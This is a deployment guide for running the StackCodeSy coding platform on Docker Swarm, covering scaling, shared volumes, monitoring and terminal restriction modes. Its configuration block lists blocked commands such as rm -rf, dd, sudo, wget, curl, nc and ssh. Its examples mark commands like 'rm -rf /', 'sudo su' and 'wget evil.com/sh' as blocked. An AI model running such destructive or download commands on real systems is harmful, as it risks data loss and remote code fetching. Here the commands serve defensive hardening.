# StackCodeSy - Docker Swarm Deployment Guide

## Overview

This guide covers deploying StackCodeSy in Docker Swarm mode for production environments with high availability, load balancing, and scalability.

---

## Prerequisites

- Docker Engine 20.10+ with Swarm mode enabled
- At least 2 nodes (1 manager, 1+ workers) recommended for production
- Shared storage for volumes (NFS, GlusterFS, or cloud storage)
- Load balancer (optional, for external access)

---

## Table of Contents

1. [Swarm Initialization](#swarm-initialization)
2. [Stack Deployment](#stack-deployment)
3. [Security Configuration](#security-configuration)
4. [Scaling](#scaling)
5. [Volume Management](#volume-management)
6. [Monitoring](#monitoring)
7. [Troubleshooting](#troubleshooting)

---

## Swarm Initialization

### 1. Initialize Swarm on Manager Node

```bash
# On the manager node
docker swarm init --advertise-addr <MANAGER-IP>

# This will output a join command for worker nodes, example:
# docker swarm join --token SWMTKN-xxx <MANAGER-IP>:2377
```

### 2. Add Worker Nodes

```bash
# On each worker node, run the join command from step 1
docker swarm join --token SWMTKN-xxx <MANAGER-IP>:2377
```

### 3. Verify Swarm Status

```bash
# On manager node
docker node ls

# Output should show all nodes with STATUS "Ready"
```

---

## Stack Deployment

### Method 1: Deploy with Default Configuration

```bash
# Create stack with default settings (development)
docker stack deploy -c docker-compose.yml stackcodesy
```

### Method 2: Deploy with Environment File

```bash
# Create environment file
cat > .env << 'EOF'
STACKCODESY_REQUIRE_AUTH=true
STACKCODESY_TERMINAL_MODE=restricted
STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,node,git,python,make
STACKCODESY_AUTH_API=https://yourapi.com/auth
EOF

# Deploy stack
docker stack deploy -c docker-compose.yml stackcodesy
```

### Method 3: Deploy with Multiple Compose Files (Recommended)

```bash
# Base configuration + production overrides
docker stack deploy \
  -c docker-compose.yml \
  -c docker-compose.prod.yml \
  stackcodesy
```

---

## Security Configuration

### Production Configuration Template

Create `docker-compose.prod.yml`:

```yaml
version: '3.8'

services:
  stackcodesy:
    environment:
      # Authentication
      - STACKCODESY_REQUIRE_AUTH=true
      - STACKCODESY_AUTH_API=${AUTH_API_URL}

      # Terminal Security - RESTRICTED mode
      - STACKCODESY_TERMINAL_MODE=restricted
      - STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
      - STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,pnpm,node,git,python,make,cargo
      - STACKCODESY_TERMINAL_BLOCKED_COMMANDS=rm -rf,dd,sudo,wget,curl,ssh
      - STACKCODESY_TERMINAL_WORKSPACE_DIR=/workspace

    deploy:
      replicas: 3  # High availability
      placement:
        constraints:
          - node.role == worker
          - node.labels.environment == production

      resources:
        limits:
          cpus: '1.5'
          memory: 3G
        reservations:
          cpus: '0.5'
          memory: 1G

    # Security options
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - DAC_OVERRIDE
      - SETGID
      - SETUID
```

### Terminal Security Modes

#### Mode 1: Disabled (Maximum Security)

```yaml
environment:
  - STACKCODESY_TERMINAL_MODE=disabled
```

**Use Case:** Public platforms, untrusted users, maximum security
**Restrictions:** No terminal access at all

#### Mode 2: Restricted (Recommended for Production)

```yaml
environment:
  - STACKCODESY_TERMINAL_MODE=restricted
  - STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
  - STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,node,git,make
  - STACKCODESY_TERMINAL_WORKSPACE_DIR=/workspace
```

**Use Case:** Build platforms, coding platforms with known workflows
**Restrictions:**
- ✅ Can run: `yarn build`, `npm install`, `git commit`, etc.
- ❌ Cannot run: `rm -rf /`, `sudo`, `wget malicious.com`, etc.
- ❌ Cannot escape workspace directory
- ✅ Safe for multi-tenant environments

#### Mode 3: Full (Development Only)

```yaml
environment:
  - STACKCODESY_TERMINAL_MODE=full
```

**Use Case:** Internal development, trusted users only
**Restrictions:** None - full bash access

---

## Terminal Restriction Examples

### Example 1: Node.js Build Platform

```yaml
# Allow only Node.js and Git commands
environment:
  - STACKCODESY_TERMINAL_MODE=restricted
  - STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,pnpm,node,git
  - STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
  - STACKCODESY_TERMINAL_BLOCKED_COMMANDS=rm -rf,sudo,curl,wget
```

**What users can do:**
```bash
npm install        # ✅ Allowed
yarn build         # ✅ Allowed
git commit -m ""   # ✅ Allowed
node app.js        # ✅ Allowed
```

**What users CANNOT do:**
```bash
rm -rf /           # ❌ Blocked (dangerous command)
sudo su            # ❌ Blocked (privilege escalation)
wget evil.com/sh   # ❌ Blocked (network download)
cd /etc            # ❌ Blocked (outside workspace)
curl http://...    # ❌ Blocked (network access)
```

### Example 2: Python Development Platform

```yaml
environment:
  - STACKCODESY_TERMINAL_MODE=restricted
  - STACKCODESY_TERMINAL_ALLOWED_COMMANDS=python,python3,pip,pip3,git,make
  - STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
```

### Example 3: Full Stack Platform (Multiple Languages)

```yaml
environment:
  - STACKCODESY_TERMINAL_MODE=restricted
  - STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,node,python,python3,pip,go,cargo,make,gcc,git
  - STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
  - STACKCODESY_TERMINAL_BLOCKED_COMMANDS=rm -rf,dd,sudo,wget,curl,nc,ssh
```

---

## Scaling

### Manual Scaling

```bash
# Scale to 5 replicas
docker service scale stackcodesy_stackcodesy=5

# Verify scaling
docker service ps stackcodesy_stackcodesy
```

### Auto-Scaling (Using Docker Swarm Autoscaler)

Not built-in to Docker Swarm, but can use external tools:
- Orbiter
- Docker Swarm Autoscaler
- Custom scripts based on metrics

### Per-User Scaling

For platforms where each user gets their own container:

```bash
# Create stack per user
USER_ID=12345
USER_NAME="John Doe"
USER_EMAIL="john@example.com"

# Deploy dedicated stack for user
docker stack deploy \
  -c docker-compose.yml \
  --env STACKCODESY_REQUIRE_AUTH=true \
  --env STACKCODESY_USER_ID=$USER_ID \
  --env STACKCODESY_USER_NAME="$USER_NAME" \
  --env STACKCODESY_USER_EMAIL="$USER_EMAIL" \
  stackcodesy-user-$USER_ID
```

---

## Volume Management

### Shared Storage for Multi-Node Swarm

#### Option 1: NFS

```yaml
volumes:
  stackcodesy-workspace:
    driver: local
    driver_opts:
      type: nfs
      o: addr=nfs-server.example.com,rw,nolock
      device: ":/mnt/stackcodesy/workspaces"
```

#### Option 2: GlusterFS

```yaml
volumes:
  stackcodesy-workspace:
    driver: local
    driver_opts:
      type: glusterfs
      o: server=gluster1,server=gluster2
      device: "/workspaces"
```

#### Option 3: Cloud Storage (AWS EBS, Azure Disk)

```yaml
volumes:
  stackcodesy-workspace:
    driver: rexray/ebs
    driver_opts:
      size: 20
      volumetype: gp2
```

### Per-User Volumes

```bash
# Create volume per user
docker volume create \
  --driver local \
  --opt type=nfs \
  --opt o=addr=nfs.example.com,rw \
  --opt device=:/mnt/users/$USER_ID \
  stackcodesy-workspace-$USER_ID
```

---

## Monitoring

### View Service Status

```bash
# List all services
docker service ls

# View service details
docker service inspect stackcodesy_stackcodesy

# View service logs
docker service logs -f stackcodesy_stackcodesy

# View specific container logs
docker service logs -f stackcodesy_stackcodesy --tail 100
```

### Health Checks

```bash
# Check health of all replicas
docker service ps stackcodesy_stackcodesy

# Filter by health
docker service ps --filter "desired-state=running" stackcodesy_stackcodesy
```

### Monitoring Tools Integration

#### Prometheus + Grafana

```yaml
# Add to docker-compose.yml
services:
  prometheus:
    image: prom/prometheus
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    networks:
      - stackcodesy-network
    deploy:
      placement:
        constraints:
          - node.role == manager

  grafana:
    image: grafana/grafana
    ports:
      - "3000:3000"
    networks:
      - stackcodesy-network
```

---

## Updates and Rollbacks

### Rolling Update

```bash
# Update image
docker service update --image stackcodesy:v2.0 stackcodesy_stackcodesy

# Monitor update progress
docker service ps stackcodesy_stackcodesy
```

### Rollback

```bash
# Rollback to previous version
docker service rollback stackcodesy_stackcodesy

# Or rollback to specific version
docker service update --rollback stackcodesy_stackcodesy
```

### Zero-Downtime Deployment

```yaml
deploy:
  update_config:
    parallelism: 1      # Update 1 container at a time
    delay: 10s          # Wait 10s between updates
    failure_action: rollback
    monitor: 60s
    max_failure_ratio: 0.3

  rollback_config:
    parallelism: 1
    delay: 5s
    failure_action: pause
```

---

## Troubleshooting

### Common Issues

#### 1. Service Not Starting

```bash
# Check service logs
docker service logs stackcodesy_stackcodesy

# Check task status
docker service ps stackcodesy_stackcodesy --no-trunc

# Check node availability
docker node ls
```

#### 2. Volume Mount Issues

```bash
# Verify volume exists
docker volume ls

# Inspect volume
docker volume inspect stackcodesy-workspace

# Check NFS mount (if using NFS)
docker exec <container-id> mount | grep nfs
```

#### 3. Network Issues

```bash
# List networks
docker network ls

# Inspect overlay network
docker network inspect stackcodesy-network

# Test connectivity
docker exec <container-id> ping stackcodesy_stackcodesy
```

#### 4. Port Binding Issues

```bash
# Check what's using port 8080
docker service ps --filter "desired-state=running" stackcodesy_stackcodesy

# Update port
docker service update --publish-add 8081:8080 stackcodesy_stackcodesy
```

### Debug Mode

```bash
# Deploy with debug logging
docker stack deploy \
  -c docker-compose.yml \
  --env NODE_ENV=development \
  stackcodesy-debug
```

---

## Security Hardening for Swarm

### 1. Enable TLS for Swarm Communication

```bash
# Already enabled by default in Swarm, but verify:
docker info | grep "Swarm: active"
```

### 2. Secrets Management

```bash
# Create secret for auth token
echo "your-secret-token" | docker secret create stackcodesy_auth_token -

# Use in compose file:
services:
  stackcodesy:
    secrets:
      - stackcodesy_auth_token
    environment:
      - STACKCODESY_AUTH_TOKEN_FILE=/run/secrets/stackcodesy_auth_token

secrets:
  stackcodesy_auth_token:
    external: true
```

### 3. Network Encryption

```yaml
networks:
  stackcodesy-network:
    driver: overlay
    driver_opts:
      encrypted: "true"
```

### 4. Read-Only Root Filesystem

```yaml
services:
  stackcodesy:
    read_only: true
    tmpfs:
      - /tmp
      - /home/stackcodesy/.stackcodesy
```

---

## Production Checklist

```
Pre-Deployment:
- [ ] Swarm cluster initialized and healthy
- [ ] Shared storage configured (NFS/GlusterFS)
- [ ] Secrets created for sensitive data
- [ ] Environment variables configured
- [ ] Terminal mode set to "restricted" or "disabled"
- [ ] Resource limits defined
- [ ] Health checks configured

Post-Deployment:
- [ ] Services running and healthy
- [ ] Volumes mounted correctly
- [ ] Authentication working
- [ ] Terminal restrictions verified
- [ ] Logging configured
- [ ] Monitoring active
- [ ] Backups configured

Security:
- [ ] STACKCODESY_REQUIRE_AUTH=true
- [ ] STACKCODESY_TERMINAL_MODE=restricted (or disabled)
- [ ] Network encryption enabled
- [ ] Secrets used for credentials
- [ ] Read-only filesystem (where possible)
- [ ] Resource limits enforced
```

---

## Example: Complete Production Deployment

```bash
#!/bin/bash
# production-deploy.sh

# 1. Initialize Swarm (if not already done)
# docker swarm init

# 2. Create secrets
echo "https://api.yourplatform.com/auth" | docker secret create stackcodesy_auth_api -

# 3. Label nodes
docker node update --label-add environment=production worker-1
docker node update --label-add environment=production worker-2

# 4. Create NFS volume
docker volume create \
  --driver local \
  --opt type=nfs \
  --opt o=addr=nfs.example.com,rw \
  --opt device=:/mnt/stackcodesy/workspace \
  stackcodesy-workspace

# 5. Deploy stack with production config
docker stack deploy \
  -c docker-compose.yml \
  -c docker-compose.prod.yml \
  stackcodesy

# 6. Verify deployment
docker service ls
docker service ps stackcodesy_stackcodesy

# 7. Check logs
docker service logs -f stackcodesy_stackcodesy --tail 50

echo "Deployment complete! Access at http://your-domain.com:8080"
```

---

## Removal

```bash
# Remove stack
docker stack rm stackcodesy

# Remove volumes (CAUTION: This deletes all data)
docker volume rm stackcodesy-workspace stackcodesy-data

# Remove secrets
docker secret rm stackcodesy_auth_api

# Leave swarm (on worker nodes)
docker swarm leave

# Leave swarm (on manager, force if last manager)
docker swarm leave --force
```

---

## Additional Resources

- [Docker Swarm Documentation](https://docs.docker.com/engine/swarm/)
- [Docker Stack Documentation](https://docs.docker.com/engine/reference/commandline/stack/)
- [Docker Secrets Management](https://docs.docker.com/engine/swarm/secrets/)
- [SECURITY_REPORT.md](SECURITY_REPORT.md) - StackCodeSy security analysis

---

**For questions or issues, see [STACKCODESY_INTEGRATION.md](STACKCODESY_INTEGRATION.md) or [SECURITY_REPORT.md](SECURITY_REPORT.md)**
